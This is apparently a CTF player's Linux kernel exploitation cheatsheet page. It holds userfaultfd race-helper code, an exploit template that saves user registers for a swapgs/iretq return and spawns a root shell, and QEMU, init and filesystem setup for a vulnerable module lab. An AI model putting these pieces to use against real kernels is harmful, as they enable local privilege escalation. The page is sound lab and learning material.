---
layout: page
title: Kernel
permalink: /kernel/
---
Kernel Cheatsheet
# userfaultfd
```c
void RegisterUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        Panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        Panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        Panic("pthread_create");
}
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(3);
    if (nready != 1)
    {
        Panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        Panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        Panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
```
# Exp Base
```c
//gcc ./fs/exp.c -masm=intel --static -o ./fs/exp
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>

#define PAGE_SIZE 0x1000
#define TTY_STRUCT_SZIE 0x2E0

void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[!] Failed to Escape");
    }
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}
void Panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
/*
--------------------------
Back to the User Space <!>
Instruction:
swapgs; iretq
--------------------------
Stack : 
...
rpi
user_cs
user_rflags
user_sp
user_ss
*/
```

# Run
```
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel ./bzImage \
    -initrd  ./rootfs.img \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr" \
    -smp cores=2,threads=1 \
    -cpu kvm64

```

# pack the filesystem
```s
find . | cpio -o --format=newc > ../rootfs.img
```

# unpack the filesystem
```s
cpio -idmv < rootfs.img
```

# init
```
#!/bin/sh
echo "N132 - INIT SCRIPT"
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
insmod /pwn.ko
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
setsid /bin/cttyhack setuidgid 0 /bin/sh
poweroff -f
```

# Compile-the-Testcase
```s
obj-m += <name>.o

KDIR =/home/n132/Desktop/kernel/linux-5.4.98/

all:
    $(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
    rm -rf *.o *.ko *.mod.* *.symvers *.order
```

# Filesystem
```s
wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2
cd busybox-1.32.1
make -j8 bzImage
make install
cd _install
mkdir -p  proc sys dev etc/init.d
vim init
chmod +x ./init
cd /home/n132/Desktop/kernel
cp -r ./busybox-1.32.1/_install .
```
